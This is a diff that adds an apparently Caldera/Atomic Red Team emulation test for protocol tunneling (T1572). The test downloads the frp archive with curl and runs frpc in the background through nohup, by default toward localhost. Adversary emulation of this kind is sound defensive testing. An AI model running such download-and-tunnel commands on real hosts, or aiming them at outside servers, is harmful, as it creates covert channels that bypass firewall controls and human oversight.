@@ -1,0 +1,69 @@
+- id: f54179ee-c782-4fe3-b836-213d3bda66a2
+  name: Install and Run frpc Reverse Proxy Client
+  description: 'Downloads and runs frpc (fast reverse proxy client), the victim-side
+    component
+
+    of the frp framework. Adversaries deploy frpc on compromised hosts to establish
+
+    outbound tunnel connections to an attacker-controlled frps server, bypassing
+
+    inbound firewall rules and exposing internal services externally.'
+  tactic: command-and-control
+  technique:
+    attack_id: T1572
+    name: Protocol Tunneling
+  platforms:
+    linux:
+      sh:
+        command: sed -i "s/^serverAddr = .*/serverAddr = \"127.0.0.1\"/" frp/frpc.toml;
+          sed -i "s/^serverPort = .*/serverPort = 7000/" frp/frpc.toml; nohup frp/frpc
+          -c frp/frpc.toml >/dev/null 2>&1 &
+        cleanup: 'pkill frpc; rm -rf #{frp_path}'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - command-and-control
+  - atomic-red-team
+  - t1572
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_url:
+        description: URL to download the frp release archive
+        type: url
+        default: https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz
+      frp_path:
+        description: Path to extract the frp archive
+        type: path
+        default: PathToAtomicsFolder/../ExternalPayloads/frp
+      server_addr:
+        description: Address of the frps server to connect to
+        type: string
+        default: 127.0.0.1
+      server_port:
+        description: Port of the frps server to connect to
+        type: integer
+        default: 7000
+    dependencies:
+    - description: 'frpc binary must exist at #{frp_path}/frpc
+
+        '
+      prereq_command: 'test -f #{frp_path}/frpc
+
+        '
+      get_prereq_command: 'mkdir -p #{frp_path}
+
+        curl -L "#{remote_url}" -o "#{frp_path}/frp.tar.gz"
+
+        tar -xzf "#{frp_path}/frp.tar.gz" --strip-components 1 -C "#{frp_path}"
+
+        rm -f "#{frp_path}/frp.tar.gz"
+
+        '
+    technique_created: '2020-03-15T16:03:39.082Z'
+    atomic_guid: f54179ee-c782-4fe3-b836-213d3bda66a2
+    import_timestamp: '2026-09-05T06:41:19.651231Z'
